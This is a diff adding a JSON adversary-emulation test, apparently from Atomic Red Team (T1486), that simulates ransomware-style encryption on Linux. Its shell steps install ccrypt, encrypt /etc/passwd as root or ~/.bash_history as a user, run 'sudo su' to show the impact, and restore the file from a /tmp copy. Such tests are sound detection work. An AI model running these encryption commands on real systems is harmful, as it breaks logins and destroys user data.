@@ -1,0 +1,123 @@
+{
+  "id": "08cbf59f-85da-4369-a5f4-049cffd7709f",
+  "name": "Encrypt files using ccrypt (FreeBSD/Linux)",
+  "description": "Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "7315e3dc-1a86-422a-a4b9-686d5d613288",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ $USER == \"root\" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "43ef164b-0f79-40e1-a2e4-22a0ce6209e3",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ $USER == \"root\" ]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi \n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b7f7ca34-9ac2-4e7a-8f2c-04d63f9b9aff",
+      "name": "Check dependency 1/1",
+      "description": "Finds where ccencrypt and ccdecrypt is located and copies input file\n",
+      "type": "execute-command",
+      "data": {
+        "command": "which_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\nif [ $USER == \"root\" ]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "66cd2c51-f58e-4a98-b9b6-1a6fcb2f4222",
+      "name": "Resolve dependency 1/1",
+      "description": "Finds where ccencrypt and ccdecrypt is located and copies input file\n",
+      "type": "execute-command",
+      "data": {
+        "command": "(which pkg \u0026\u0026 pkg install -y ccript)||(which yum \u0026\u0026 yum -y install epel-release ccrypt)||(which apt-get \u0026\u0026 DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b63d1801-388b-457e-b388-2de6ea01fab3",
+      "name": "Re-check dependency 1/1",
+      "description": "Finds where ccencrypt and ccdecrypt is located and copies input file\n",
+      "type": "execute-command",
+      "data": {
+        "command": "which_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\nif [ $USER == \"root\" ]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "7315e3dc-1a86-422a-a4b9-686d5d613288",
+      "p": "on-success",
+      "o": "43ef164b-0f79-40e1-a2e4-22a0ce6209e3"
+    },
+    {
+      "s": "7315e3dc-1a86-422a-a4b9-686d5d613288",
+      "p": "on-failure",
+      "o": "43ef164b-0f79-40e1-a2e4-22a0ce6209e3"
+    },
+    {
+      "s": "b7f7ca34-9ac2-4e7a-8f2c-04d63f9b9aff",
+      "p": "on-success",
+      "o": "7315e3dc-1a86-422a-a4b9-686d5d613288"
+    },
+    {
+      "s": "b7f7ca34-9ac2-4e7a-8f2c-04d63f9b9aff",
+      "p": "on-failure",
+      "o": "66cd2c51-f58e-4a98-b9b6-1a6fcb2f4222"
+    },
+    {
+      "s": "66cd2c51-f58e-4a98-b9b6-1a6fcb2f4222",
+      "p": "on-success",
+      "o": "b63d1801-388b-457e-b388-2de6ea01fab3"
+    },
+    {
+      "s": "b63d1801-388b-457e-b388-2de6ea01fab3",
+      "p": "on-failure",
+      "o": "7315e3dc-1a86-422a-a4b9-686d5d613288"
+    }
+  ],
+  "tags": [
+    "T1486",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "cped_file_path",
+      "type": "path",
+      "description": "path where you want your copied file to be",
+      "value": "/tmp/passwd"
+    },
+    {
+      "name": "root_input_file_path",
+      "type": "path",
+      "description": "path to the file that you want to be encrypted if you are root user",
+      "value": "/etc/passwd"
+    },
+    {
+      "name": "user_input_file_path",
+      "type": "path",
+      "description": "path to file that you want to be encrypted if you are normal user",
+      "value": "~/.bash_history"
+    },
+    {
+      "name": "impact_command",
+      "type": "string",
+      "description": "command to show impact of encryption",
+      "value": "sudo su"
+    }
+  ]
+}
